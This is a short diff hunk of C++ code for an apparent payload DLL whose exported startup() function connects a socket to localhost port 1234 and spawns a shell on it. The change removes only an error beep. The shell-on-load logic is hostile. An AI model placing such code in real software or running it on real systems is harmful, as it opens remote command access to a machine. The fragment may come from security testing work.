@@ -5,8 +5,6 @@
 
 extern "C" __declspec(dllexport) void startup()
 {
-    MessageBeep(MB_ICONERROR);
-
     SockConnect("localhost", "1234");
     SockShell();
     ExitThread(0);
